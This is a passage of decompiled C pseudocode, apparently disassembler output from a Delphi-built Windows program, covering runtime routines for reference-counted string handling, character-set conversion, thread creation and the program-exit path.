    {
      v4 = v5 - 1;
      if ( v4 )
      {
        __debugbreak();
LABEL_6:
        result = sub_4066F0(v3, HIWORD(v4), (CHAR **)*v2);
        goto LABEL_9;
      }
      result = sub_406798(v3, *v2);
    }
    else
    {
      result = (void *)Webscript::THTMLItem::GetHTML((Webscript::THTMLItem *)v3);
    }
LABEL_9:
    v2 += 3;
    --v1;
  }
  while ( v1 );
  return result;
}

//----- (00406818) --------------------------------------------------------
_DWORD *__fastcall sub_406818(int *a1, int a2)
{
  int v2; // edi
  _DWORD *v3; // esi
  _DWORD *v4; // eax
  int v5; // ecx
  int v6; // ecx
  _DWORD *result; // eax

  v2 = *a1;
  v3 = a1 + 1;
  do
  {
    v4 = (_DWORD *)*v3;
    v5 = v3[2];
    if ( !(_WORD)v5 )
      goto LABEL_6;
    v6 = v5 - 1;
    if ( v6 )
    {
      if ( v6 != 1 )
      {
        __debugbreak();
LABEL_6:
        result = sub_406C68(v4);
        goto LABEL_9;
      }
      result = sub_406C44(v4);
    }
    else
    {
      result = (_DWORD *)System::__linkproc__ WStrClr(v4, a2);
    }
LABEL_9:
    v3 += 3;
    --v2;
  }
  while ( v2 );
  return result;
}
// 40683E: variable 'a2' is possibly undefined
// 406C8C: using guessed type int __fastcall System::__linkproc__ WStrClr(_DWORD, _DWORD);

//----- (00406854) --------------------------------------------------------
unsigned int __usercall sub_406854@<eax>(int a1@<ebx>)
{
  int v1; // esi
  unsigned int result; // eax

  LOBYTE(a1) = 16;
  v1 = dword_465000;
  do
  {
    Text[(unsigned __int8)a1] = v1 % 10 + 48;
    v1 /= 10;
    --a1;
  }
  while ( v1 );
  LOBYTE(a1) = 28;
  result = dword_465004;
  do
  {
    Text[(unsigned __int8)a1] = byte_4659E7[result & 0xF];
    result >>= 4;
    --a1;
  }
  while ( result );
  return result;
}
// 465000: using guessed type int dword_465000;
// 465004: using guessed type int dword_465004;

//----- (004068B0) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
BOOL __fastcall sub_4068B0(const void **a1, int a2, int a3, int a4, int a5, int a6)
{
  qmemcpy(a1, *a1, 0x30u);
  return _InterlockedExchange(&dword_465000, 0) == 0;
}
// 4068D7: positive sp value 4 has been found
// 4068B0: could not find valid save-restore pair for ebp
// 4068B0: could not find valid save-restore pair for edi
// 4068B0: could not find valid save-restore pair for esi
// 465000: using guessed type int dword_465000;

//----- (004068DC) --------------------------------------------------------
void __fastcall sub_4068DC(int a1, int a2, DWORD a3)
{
  HANDLE StdHandle; // eax
  HANDLE v4; // eax
  const void *v5; // [esp-10h] [ebp-14h]
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] BYREF

  NumberOfBytesWritten = a3;
  if ( byte_469054 )
  {
    if ( word_469340 == -10318 )
    {
      if ( dword_469348 )
        dword_469358(&unk_46933C);
    }
    StdHandle = GetStdHandle(0xFFFFFFF5);
    WriteFile(StdHandle, Text, 0x1Du, &NumberOfBytesWritten, 0);
    v5 = (const void *)sub_4074F8((int)&dword_406970);
    v4 = GetStdHandle(0xFFFFFFF5);
    WriteFile(v4, v5, 2u, &NumberOfBytesWritten, 0);
  }
  else if ( !byte_465032 )
  {
    MessageBoxA(0, Text, Caption, 0);
  }
}
// 406970: using guessed type int dword_406970;
// 465032: using guessed type char byte_465032;
// 469054: using guessed type char byte_469054;
// 469340: using guessed type __int16 word_469340;
// 469348: using guessed type int dword_469348;
// 469358: using guessed type int (__fastcall *dword_469358)(_DWORD);

//----- (00406974) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall __noreturn sub_406974(int a1@<ebx>)
{
  int v1; // eax
  int v2; // edx
  DWORD v3; // ecx
  int v4; // edx
  int v5; // ecx
  void (*v6)(void); // ebx
  _DWORD *i; // ebx
  int v8; // eax
  int v9; // edx
  struct _EXCEPTION_REGISTRATION_RECORD *v10; // eax
  int v11; // edx
  int v12; // ecx
  int v13; // [esp-8h] [ebp-18h]
  int v14; // [esp-4h] [ebp-14h]
  int v15; // [esp+0h] [ebp-10h]
  int v16; // [esp+4h] [ebp-Ch]
  int *v17; // [esp+8h] [ebp-8h]
  void *v18; // [esp+Ch] [ebp-4h]

  if ( dword_465004 )
  {
    v1 = sub_406854(a1);
    sub_4068DC(v1, v2, v3);
    dword_465004 = 0;
  }
  if ( dword_46BBC8 && GetCurrentThreadId() == dword_46BBF0 )
  {
    sub_4065AC((int)&dword_46BBC4);
    sub_4068B0(&dword_46BBC4, v4, v5, v15, v14, v13);
  }
  if ( !*((_BYTE *)&unk_46BB94 + 40) && unk_469050 )
  {
    do
    {
      v6 = (void (*)(void))unk_469050;
      unk_469050 = 0;
      v6();
    }
    while ( unk_469050 );
  }
  while ( 1 )
  {
    if ( *((_BYTE *)&unk_46BB94 + 40) == 2 && !dword_465000 )
      *((_DWORD *)&unk_46BB94 + 3) = 0;
    if ( !*((_BYTE *)&unk_46BB94 + 40) )
    {
      for ( i = (_DWORD *)sub_404E38(); i; i = (_DWORD *)sub_404E38() )
        sub_405598(i);
    }
    sub_4065D4();
    if ( *((_BYTE *)&unk_46BB94 + 40) <= 1u || dword_465000 )
    {
      if ( *((_DWORD *)&unk_46BB94 + 4) )
      {
        System::UnregisterModule();
        v8 = *((_DWORD *)&unk_46BB94 + 4);
        v9 = *(_DWORD *)(v8 + 16);
        if ( v9 != *(_DWORD *)(v8 + 4) )
        {
          if ( v9 )
            FreeLibrary(*(HMODULE *)(v8 + 16));
        }
      }
    }
    v10 = sub_4065AC((int)&unk_46BB94);
    if ( *((_BYTE *)&unk_46BB94 + 40) == 1 )
      v10 = (struct _EXCEPTION_REGISTRATION_RECORD *)(*((int (__fastcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))&unk_46BB94
                                                      + 9))(v10);
    if ( *((_BYTE *)&unk_46BB94 + 40) )
      v10 = (struct _EXCEPTION_REGISTRATION_RECORD *)sub_4068B0(
                                                       (const void **)&unk_46BB94,
                                                       v11,
                                                       v12,
                                                       (int)v18,
                                                       (int)v17,
                                                       v16);
    if ( !unk_46BB94 )
    {
      if ( dword_469034 )
        ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *))dword_469034)(v10);
      ExitProcess(dword_465000);
    }
    v18 = &unk_46BB94;
    v17 = &dword_465000;
    qmemcpy(&unk_46BB94, unk_46BB94, 0x30u);
  }
}
// 406A6A: positive sp value 8 has been found
// 406995: variable 'v2' is possibly undefined
// 406995: variable 'v3' is possibly undefined
// 4069C6: variable 'v4' is possibly undefined
// 4069C6: variable 'v5' is possibly undefined
// 4069C6: variable 'v15' is possibly undefined
// 4069C6: variable 'v14' is possibly undefined
// 4069C6: variable 'v13' is possibly undefined
// 406A65: variable 'v11' is possibly undefined
// 406A65: variable 'v12' is possibly undefined
// 406A65: variable 'v18' is possibly undefined
// 406A65: variable 'v17' is possibly undefined
// 406A65: variable 'v16' is possibly undefined
// 409FDC: using guessed type _DWORD System::UnregisterModule();
// 465000: using guessed type int dword_465000;
// 465004: using guessed type int dword_465004;
// 469034: using guessed type int dword_469034;
// 46BBC4: using guessed type const void *dword_46BBC4;
// 46BBC8: using guessed type int dword_46BBC8;
// 46BBF0: using guessed type int dword_46BBF0;

//----- (00406AA4) --------------------------------------------------------
void __usercall __noreturn sub_406AA4(int a1@<eax>, int a2@<ebx>)
{
  dword_465000 = a1;
  sub_406974(a2);
}
// 465000: using guessed type int dword_465000;

//----- (00406AB0) --------------------------------------------------------
void __usercall __noreturn sub_406AB0(unsigned __int8 a1@<al>, int a2@<ebx>)
{
  int retaddr; // [esp+6h] [ebp+4h]

  dword_465004 = retaddr;
  sub_406AA4(a1, a2);
}
// 465004: using guessed type int dword_465004;

//----- (00406B04) --------------------------------------------------------
HANDLE __fastcall sub_406B04(
        struct _SECURITY_ATTRIBUTES *a1,
        DWORD a2,
        int a3,
        int a4,
        DWORD dwCreationFlags,
        LPDWORD lpThreadId)
{
  _DWORD *Mem; // ebx
  HANDLE Thread; // esi

  if ( dword_465034 )
  {
    Mem = (_DWORD *)dword_465034(a3, a4);
  }
  else
  {
    Mem = (_DWORD *)System::__linkproc__ GetMem(8);
    *Mem = a3;
    Mem[1] = a4;
  }
  byte_469055 = 1;
  Thread = CreateThread(a1, a2, unknown_libname_44, Mem, dwCreationFlags, lpThreadId);
  if ( !Thread )
    System::__linkproc__ FreeMem(Mem);
  return Thread;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 465034: using guessed type int (__fastcall *dword_465034)(_DWORD, _DWORD);
// 469055: using guessed type char byte_469055;

//----- (00406B98) --------------------------------------------------------
int __fastcall sub_406B98(int a1, int a2, int a3)
{
  bool v3; // of
  int v4; // eax
  int v5; // eax
  int result; // eax

  if ( a1 <= 0 )
    return 0;
  v3 = __OFADD__(a1, a1);
  v4 = 2 * a1;
  if ( v3 || (v3 = __OFADD__(14, v4), v5 = v4 + 14, v3) )
    sub_404ED0(5, a2, a3);
  result = System::__linkproc__ GetMem(v5) + 12;
  *(_DWORD *)(result - 8) = 1;
  *(_DWORD *)(result - 4) = a1;
  *(_WORD *)(result + 2 * a1) = 0;
  *(_WORD *)(result - 10) = 2;
  *(_WORD *)(result - 12) = dword_46997C;
  return result;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 46997C: using guessed type int dword_46997C;

//----- (00406BD8) --------------------------------------------------------
int __fastcall sub_406BD8(int a1, int a2, int a3)
{
  bool v3; // of
  int v4; // eax
  int Mem; // eax
  __int16 v6; // cx
  int result; // eax
  unsigned int v8; // [esp-Ch] [ebp-Ch]

  if ( a1 <= 0 )
    return 0;
  v3 = __OFADD__(14, a1);
  v4 = a1 + 14;
  if ( v3 )
    sub_404ED0(5, a2, a3);
  v8 = v4 & 0xFFFFFFFE;
  Mem = System::__linkproc__ GetMem(v4 & 0xFFFFFFFE);
  v6 = a2;
  *(_WORD *)(v8 + Mem - 2) = 0;
  result = Mem + 12;
  *(_DWORD *)(result - 4) = a1;
  *(_DWORD *)(result - 8) = 1;
  if ( !a2 )
    v6 = cchWideChar;
  *(_WORD *)(result - 12) = v6;
  *(_WORD *)(result - 10) = 1;
  return result;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);

//----- (00406C44) --------------------------------------------------------
_DWORD *__fastcall sub_406C44(_DWORD *result)
{
  int v1; // edx
  _DWORD *v2; // [esp-4h] [ebp-4h]

  v1 = *result;
  if ( *result )
  {
    *result = 0;
    if ( *(int *)(v1 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v1 - 8)) )
    {
      v2 = result;
      System::__linkproc__ FreeMem(v1 - 12);
      return v2;
    }
  }
  return result;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (00406C68) --------------------------------------------------------
_DWORD *__fastcall sub_406C68(_DWORD *result)
{
  int v1; // edx
  _DWORD *v2; // [esp-4h] [ebp-4h]

  v1 = *result;
  if ( *result )
  {
    *result = 0;
    if ( *(int *)(v1 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v1 - 8)) )
    {
      v2 = result;
      System::__linkproc__ FreeMem(v1 - 12);
      return v2;
    }
  }
  return result;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (00406CA4) --------------------------------------------------------
int __fastcall sub_406CA4(int result, int a2)
{
  int *v2; // ebx
  int v4; // edx

  v2 = (int *)result;
  do
  {
    v4 = *v2;
    if ( *v2 )
    {
      *v2 = 0;
      if ( *(int *)(v4 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v4 - 8)) )
        result = System::__linkproc__ FreeMem(v4 - 12);
    }
    ++v2;
    --a2;
  }
  while ( a2 );
  return result;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (00406CD4) --------------------------------------------------------
int __fastcall sub_406CD4(int result, int a2)
{
  int *v2; // ebx
  int v4; // edx

  v2 = (int *)result;
  do
  {
    v4 = *v2;
    if ( *v2 )
    {
      *v2 = 0;
      if ( *(int *)(v4 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v4 - 8)) )
        result = System::__linkproc__ FreeMem(v4 - 12);
    }
    ++v2;
    --a2;
  }
  while ( a2 );
  return result;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (00406D48) --------------------------------------------------------
int __fastcall sub_406D48(
        CHAR *lpDefaultChar,
        int cbMultiByte,
        const WCHAR *a3,
        LPBOOL CodePage,
        UINT lpUsedDefaultChar)
{
  LPBOOL v5; // esi

  v5 = (LPBOOL)lpUsedDefaultChar;
  if ( !lpUsedDefaultChar )
    v5 = (LPBOOL)cchWideChar;
  return sub_40B588((UINT)v5, 0, a3, (int)CodePage, lpDefaultChar, cbMultiByte, 0, 0);
}

//----- (00406D74) --------------------------------------------------------
int __fastcall sub_406D74(LPWSTR lpWideCharStr, int cbMultiByte, const CHAR *a3, int CodePage, UINT cchWideChar)
{
  return sub_40B5B0(cchWideChar, 0, a3, CodePage, lpWideCharStr, cbMultiByte);
}

//----- (00406D90) --------------------------------------------------------
_DWORD *__fastcall sub_406D90(_DWORD *a1, void *a2, int a3)
{
  void *v6; // eax
  int v7; // ecx
  void *v8; // edi
  _DWORD *result; // eax

  v6 = (void *)sub_406B98(a3, (int)a2, a3);
  v7 = a3;
  v8 = v6;
  if ( a2 )
    System::Move(a2, v6, 2 * v7);
  result = sub_406C68(a1);
  *a1 = v8;
  return result;
}

//----- (00406DC0) --------------------------------------------------------
void __fastcall sub_406DC0(BSTR *a1, OLECHAR *a2, UINT a3)
{
  BSTR v3; // eax
  int v4; // ecx
  BSTR *v5; // edx
  OLECHAR *v7; // [esp-4h] [ebp-4h]

  if ( a3 )
  {
    v3 = SysAllocStringLen(a2, a3);
    v5 = a1;
    if ( !v3 )
      sub_404ED0(1, (int)a1, v4);
    v7 = *a1;
    *v5 = v3;
    SysFreeString(v7);
  }
  else
  {
    System::__linkproc__ WStrClr(a1, a2);
  }
}
// 406C26: variable 'v4' is possibly undefined
// 406C8C: using guessed type int __fastcall System::__linkproc__ WStrClr(_DWORD, _DWORD);

//----- (00406DE4) --------------------------------------------------------
_DWORD *__fastcall sub_406DE4(_DWORD *a1, void *a2, int a3, unsigned __int16 a4)
{
  void *v7; // eax
  int v8; // ecx
  void *v9; // edi
  _DWORD *result; // eax

  v7 = (void *)sub_406BD8(a3, a4, a3);
  v8 = a3;
  v9 = v7;
  if ( a2 )
    System::Move(a2, v7, v8);
  result = sub_406C68(a1);
  *a1 = v9;
  return result;
}

//----- (00406E1C) --------------------------------------------------------
_DWORD *__fastcall sub_406E1C(_DWORD *a1, int a2, int CodePage, int cchWideChar)
{
  int v7; // ebx
  int v8; // ecx
  int v9; // ebx
  WCHAR WideCharStr; // [esp+0h] [ebp-1004h] BYREF
  _DWORD *v11; // [esp+4h] [ebp-1000h]
  int v12; // [esp+1000h] [ebp-4h]

  v11 = a1;
  v12 = a2;
  if ( CodePage <= 0 )
    return sub_406C44(a1);
  if ( CodePage + 1 < 2047 )
  {
    v7 = sub_406D74(&WideCharStr, 2047, (const CHAR *)v12, CodePage, cchWideChar);
    if ( v7 > 0 )
      return sub_406D90(a1, &WideCharStr, v7);
  }
  sub_407890(a1, CodePage + 1, CodePage);
  v9 = sub_406D74((LPWSTR)*a1, CodePage + 1, (const CHAR *)v12, CodePage, cchWideChar);
  if ( v9 < 0 )
    v9 = 0;
  return sub_407890(a1, v9, v8);
}
// 406E80: variable 'CodePage' is possibly undefined
// 406EA2: variable 'v8' is possibly undefined

//----- (00406EB0) --------------------------------------------------------
_DWORD *__fastcall sub_406EB0(_DWORD *a1, int a2, int a3)
{
  return sub_406E1C(a1, a2, a3, cchWideChar);
}

//----- (00406EC0) --------------------------------------------------------
void __fastcall sub_406EC0(const void **a1, int a2, int CodePage, int cchWideChar)
{
  int v6; // ebx
  int v7; // ebx
  OLECHAR WideCharStr; // [esp+0h] [ebp-1004h] BYREF
  const void **v9; // [esp+4h] [ebp-1000h]
  int v10; // [esp+1000h] [ebp-4h]

  v9 = a1;
  v10 = a2;
  if ( CodePage > 0 )
  {
    if ( CodePage + 1 >= 2047
      || (v6 = sub_406D74(&WideCharStr, 2047, (const CHAR *)v10, CodePage, cchWideChar), v6 <= 0) )
    {
      sub_407748(a1, CodePage + 1);
      v7 = sub_406D74((LPWSTR)*a1, CodePage + 1, (const CHAR *)v10, CodePage, cchWideChar);
      if ( v7 < 0 )
        v7 = 0;
      sub_407748(a1, v7);
    }
    else
    {
      sub_406DC0((BSTR *)a1, &WideCharStr, v6);
    }
  }
  else
  {
    System::__linkproc__ WStrClr(a1, a2);
  }
}
// 406C8C: using guessed type int __fastcall System::__linkproc__ WStrClr(_DWORD, _DWORD);

//----- (00406F64) --------------------------------------------------------
CHAR *__fastcall sub_406F64(CHAR **a1, const WCHAR *a2, BOOL *a3, unsigned __int16 a4)
{
  unsigned __int16 v5; // bx
  CHAR *result; // eax
  int v7; // esi

  v5 = a4;
  if ( (int)a3 <= 0 )
    return (CHAR *)sub_406C68(a1);
  if ( !a4 )
    v5 = cchWideChar;
  v7 = sub_406D48(0, 0, a2, a3, v5);
  sub_4075BC(a1, v7, 0);
  if ( v7 <= 0 )
    return (CHAR *)sub_406C68(a1);
  sub_406D48(*a1, v7, a2, a3, v5);
  result = *a1 - 12;
  *(_WORD *)result = v5;
  return result;
}

//----- (00406FE8) --------------------------------------------------------
volatile __int32 *__fastcall sub_406FE8(volatile __int32 *result, int a2)
{
  int v2; // ecx
  char v3; // cc
  int v4; // ecx
  void *v5; // edx
  const void *v6; // eax
  __int32 v7; // edx
  const void *v8; // [esp-8h] [ebp-8h]
  int v9; // [esp-8h] [ebp-8h]
  volatile __int32 *v10; // [esp-4h] [ebp-4h]

  if ( a2 )
  {
    v2 = *(_DWORD *)(a2 - 8);
    v3 = (v2 + 1 < 0) ^ __OFADD__(1, v2) | (v2 == -1);
    v4 = v2 + 1;
    if ( v3 )
    {
      v10 = result;
      v8 = (const void *)a2;
      v5 = (void *)sub_406B98(*(_DWORD *)(a2 - 4), a2, v4);
      v6 = v8;
      v9 = (int)v5;
      System::Move(v6, v5, 2 * *((_DWORD *)v6 - 1));
      a2 = v9;
      result = v10;
    }
    else
    {
      _InterlockedIncrement((volatile signed __int32 *)(a2 - 8));
    }
  }
  v7 = _InterlockedExchange(result, a2);
  if ( v7 && *(int *)(v7 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v7 - 8)) )
    return (volatile __int32 *)System::__linkproc__ FreeMem(v7 - 12);
  return result;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (00407030) --------------------------------------------------------
volatile __int32 *__fastcall sub_407030(volatile __int32 *result, __int32 a2)
{
  __int32 v2; // edx

  if ( a2 && !((*(_DWORD *)(a2 - 8) + 1 < 0) ^ __OFADD__(1, *(_DWORD *)(a2 - 8)) | (*(_DWORD *)(a2 - 8) == -1)) )
    _InterlockedIncrement((volatile signed __int32 *)(a2 - 8));
  v2 = _InterlockedExchange(result, a2);
  if ( v2 && *(int *)(v2 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v2 - 8)) )
    return (volatile __int32 *)System::__linkproc__ FreeMem(v2 - 12);
  return result;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (00407084) --------------------------------------------------------
volatile __int32 *__fastcall sub_407084(volatile __int32 *result, __int32 a2)
{
  int v2; // ecx
  char v3; // cc
  int v4; // ecx
  void *v5; // edx
  const void *v6; // eax
  __int32 v7; // edx
  const void *v8; // [esp-8h] [ebp-8h]
  __int32 v9; // [esp-8h] [ebp-8h]
  volatile __int32 *v10; // [esp-4h] [ebp-4h]

  if ( a2 )
  {
    v2 = *(_DWORD *)(a2 - 8);
    v3 = (v2 + 1 < 0) ^ __OFADD__(1, v2) | (v2 == -1);
    v4 = v2 + 1;
    if ( v3 )
    {
      v10 = result;
      v8 = (const void *)a2;
      v5 = (void *)sub_406BD8(*(_DWORD *)(a2 - 4), *(unsigned __int16 *)(a2 - 12), v4);
      v6 = v8;
      v9 = (__int32)v5;
      System::Move(v6, v5, *((_DWORD *)v6 - 1));
      a2 = v9;
      result = v10;
    }
    else
    {
      _InterlockedIncrement((volatile signed __int32 *)(a2 - 8));
    }
  }
  v7 = _InterlockedExchange(result, a2);
  if ( v7 && *(int *)(v7 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v7 - 8)) )
    return (volatile __int32 *)System::__linkproc__ FreeMem(v7 - 12);
  return result;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (004070CC) --------------------------------------------------------
volatile __int32 *__fastcall sub_4070CC(volatile __int32 *result, __int32 a2)
{
  __int32 v2; // edx

  if ( a2 && !((*(_DWORD *)(a2 - 8) + 1 < 0) ^ __OFADD__(1, *(_DWORD *)(a2 - 8)) | (*(_DWORD *)(a2 - 8) == -1)) )
    _InterlockedIncrement((volatile signed __int32 *)(a2 - 8));
  v2 = _InterlockedExchange(result, a2);
  if ( v2 && *(int *)(v2 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v2 - 8)) )
    return (volatile __int32 *)System::__linkproc__ FreeMem(v2 - 12);
  return result;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (00407110) --------------------------------------------------------
int __fastcall sub_407110(int a1)
{
  int v1; // edx

  v1 = 0;
  if ( a1 )
  {
    while ( *(_BYTE *)(a1 + v1) )
      ++v1;
  }
  return v1;
}

//----- (00407124) --------------------------------------------------------
int __fastcall sub_407124(int a1)
{
  int v1; // edx

  v1 = 0;
  if ( a1 )
  {
    while ( *(_WORD *)(a1 + 2 * v1) )
      ++v1;
  }
  return v1;
}

//----- (00407138) --------------------------------------------------------
int __fastcall sub_407138(volatile __int32 *a1)
{
  int v1; // edx
  void *v3; // eax
  char *v5; // [esp-8h] [ebp-8h]

  v1 = *a1;
  if ( *a1 && *(_DWORD *)(v1 - 8) != 1 )
  {
    v3 = (void *)sub_406B98(*(_DWORD *)(v1 - 4), v1, *(_DWORD *)(v1 - 8) - 1);
    v5 = (char *)_InterlockedExchange(a1, (__int32)v3);
    System::Move(v5, v3, 2 * *((_DWORD *)v5 - 1));
    if ( *((int *)v5 - 2) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)v5 - 2) )
      System::__linkproc__ FreeMem(v5 - 12);
    return *a1;
  }
  return v1;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (0040717C) --------------------------------------------------------
__int32 __fastcall sub_40717C(volatile __int32 *a1)
{
  volatile __int32 v1; // edx
  void *v3; // eax
  char *v5; // [esp-8h] [ebp-8h]

  v1 = *a1;
  if ( *a1 && *(_DWORD *)(v1 - 8) != 1 )
  {
    v3 = (void *)sub_406BD8(*(_DWORD *)(v1 - 4), *(unsigned __int16 *)(v1 - 12), *(_DWORD *)(v1 - 8) - 1);
    v5 = (char *)_InterlockedExchange(a1, (__int32)v3);
    System::Move(v5, v3, *((_DWORD *)v5 - 1));
    if ( *((int *)v5 - 2) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)v5 - 2) )
      System::__linkproc__ FreeMem(v5 - 12);
    return *a1;
  }
  return v1;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (00407248) --------------------------------------------------------
_DWORD *__fastcall sub_407248(_DWORD *a1, _BYTE *a2, int a3, unsigned __int16 a4)
{
  int v4; // ecx
  _BYTE *v5; // ecx
  _BYTE *v7; // [esp-8h] [ebp-8h]

  v4 = 0;
  if ( a2 )
  {
    v7 = a2;
    while ( *a2 )
    {
      if ( !a2[1] )
        goto LABEL_10;
      if ( !a2[2] )
        goto LABEL_9;
      if ( !a2[3] )
      {
        ++a2;
LABEL_9:
        ++a2;
LABEL_10:
        ++a2;
        break;
      }
      a2 += 4;
    }
    v5 = a2;
    a2 = v7;
    v4 = v5 - v7;
  }
  return sub_406DE4(a1, a2, v4, a4);
}

//----- (0040727C) --------------------------------------------------------
CHAR *__fastcall sub_40727C(CHAR **a1, int a2, int a3, unsigned __int16 a4)
{
  BOOL *v4; // ecx
  int v5; // ecx
  int v7; // [esp-8h] [ebp-8h]

  v4 = 0;
  if ( a2 )
  {
    v7 = a2;
    while ( *(_WORD *)a2 )
    {
      if ( !*(_WORD *)(a2 + 2) )
        goto LABEL_10;
      if ( !*(_WORD *)(a2 + 4) )
        goto LABEL_9;
      if ( !*(_WORD *)(a2 + 6) )
      {
        a2 += 2;
LABEL_9:
        a2 += 2;
LABEL_10:
        a2 += 2;
        break;
      }
      a2 += 8;
    }
    v5 = a2;
    a2 = v7;
    v4 = (BOOL *)((unsigned int)(v5 - v7) >> 1);
  }
  return sub_406F64(a1, (const WCHAR *)a2, v4, a4);
}

//----- (004072BC) --------------------------------------------------------
CHAR *__fastcall sub_4072BC(CHAR **a1, const WCHAR *a2, int a3, unsigned __int16 a4)
{
  BOOL *v4; // ecx

  v4 = 0;
  if ( a2 )
    v4 = (BOOL *)(*((_DWORD *)a2 - 1) >> 1);
  return sub_406F64(a1, a2, v4, a4);
}

//----- (004072D4) --------------------------------------------------------
volatile __int32 *__fastcall sub_4072D4(volatile __int32 *result, _DWORD *a2)
{
  _DWORD *v2; // ecx
  volatile __int32 *v3; // ebx
  int v5; // edi
  int v6; // edx
  bool v7; // of
  int v8; // edx
  _DWORD *v9; // eax
  int v10; // ecx

  if ( a2 )
  {
    v2 = (_DWORD *)*result;
    if ( *result )
    {
      v3 = result;
      v5 = *(v2 - 1);
      v6 = *(a2 - 1);
      v7 = __OFADD__(v5, v6);
      v8 = v5 + v6;
      if ( v7 )
        sub_404ED0(5, v8, (int)v2);
      if ( a2 == v2 )
      {
        sub_4075BC(result, v8, *((unsigned __int16 *)v2 - 6));
        v9 = (_DWORD *)*v3;
        v10 = v5;
      }
      else
      {
        sub_4075BC(result, v8, *((unsigned __int16 *)v2 - 6));
        v9 = a2;
        v10 = *(a2 - 1);
      }
      return (volatile __int32 *)System::Move(v9, (void *)(v5 + *v3), v10);
    }
    else
    {
      return sub_407084(result, (__int32)a2);
    }
  }
  return result;
}

//----- (0040732C) --------------------------------------------------------
volatile __int32 *__fastcall sub_40732C(volatile __int32 *a1, _DWORD *a2, _DWORD *a3)
{
  int v4; // edi
  bool v5; // of
  int v6; // edi
  char *v9; // edi

  if ( !a2 )
    return sub_407084(a1, (__int32)a3);
  if ( !a3 )
    return sub_407084(a1, (__int32)a2);
  if ( a2 == *(_DWORD **)a1 )
    return sub_4072D4(a1, a3);
  if ( a3 == *(_DWORD **)a1 )
  {
    v4 = *(a2 - 1);
    v5 = __OFADD__(*(a3 - 1), v4);
    v6 = *(a3 - 1) + v4;
    if ( v5 )
      sub_404ED0(5, (int)a2, (int)a3);
    v9 = (char *)sub_406BD8(v6, *((unsigned __int16 *)a3 - 6), (int)a3);
    System::Move(a2, v9, *(a2 - 1));
    System::Move(a3, &v9[*(a2 - 1)], *(a3 - 1));
    if ( v9 )
      --*((_DWORD *)v9 - 2);
    return sub_407084(a1, (__int32)v9);
  }
  else
  {
    sub_407084(a1, (__int32)a2);
    return sub_4072D4(a1, a3);
  }
}

//----- (004073B0) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __fastcall sub_4073B0(__int32 *a1, int a2)
{
  int v2; // ebx
  __int32 *v3; // edi
  int v4; // ecx
  int v5; // eax
  int v6; // ecx
  bool v7; // of
  int v8; // esi
  char *v9; // esi
  _DWORD *v10; // eax
  void *v11; // edx
  int v12; // ecx
  __int32 v14; // [esp-4h] [ebp-20h]
  int v16; // [esp+14h] [ebp-8h]
  int v17; // [esp+18h] [ebp-4h]

  v16 = 0;
  v2 = a2;
  v3 = 0;
  v4 = *(&v17 + a2);
  if ( v4 && (v16 = *(unsigned __int16 *)(v4 - 12), *a1 == v4) )
  {
    v3 = (__int32 *)*(&v17 + a2);
    v5 = *(_DWORD *)(v4 - 4);
    --a2;
  }
  else
  {
    v5 = 0;
  }
  do
  {
    v6 = *(&v17 + a2);
    if ( v6 )
    {
      v7 = __OFADD__(*(_DWORD *)(v6 - 4), v5);
      v5 += *(_DWORD *)(v6 - 4);
      if ( v7 )
        sub_404ED0(5, a2, v6);
      if ( !v16 )
        v16 = *(unsigned __int16 *)(v6 - 12);
      if ( v3 == (__int32 *)v6 )
        v3 = 0;
    }
    --a2;
  }
  while ( a2 );
  if ( v3 )
  {
    v8 = *(v3 - 1);
    sub_4075BC(a1, v5, *((unsigned __int16 *)v3 - 6));
    v3 = a1;
    v14 = *a1;
    v9 = (char *)(*a1 + v8);
    --v2;
  }
  else
  {
    v14 = sub_406BD8(v5, v16, v6);
    v9 = (char *)v14;
  }
  do
  {
    v10 = (_DWORD *)*(&v17 + v2);
    v11 = v9;
    if ( v10 )
    {
      v12 = *(v10 - 1);
      v9 += v12;
      System::Move(v10, v11, v12);
    }
    --v2;
  }
  while ( v2 );
  if ( !v3 )
  {
    if ( v14 )
      --*(_DWORD *)(v14 - 8);
    sub_407084(a1, v14);
  }
  return v16;
}
// 40746D: positive sp value 4 has been found

//----- (00407478) --------------------------------------------------------
int __fastcall sub_407478(int result, int a2)
{
  int v2; // ecx
  _DWORD *v3; // edx
  int *v4; // ebx
  int v5; // ecx

  if ( result != a2 && ((a2 & result) != 0 || result && a2) )
  {
    v2 = *(_DWORD *)(result - 4);
    if ( v2 == *(_DWORD *)(a2 - 4) )
    {
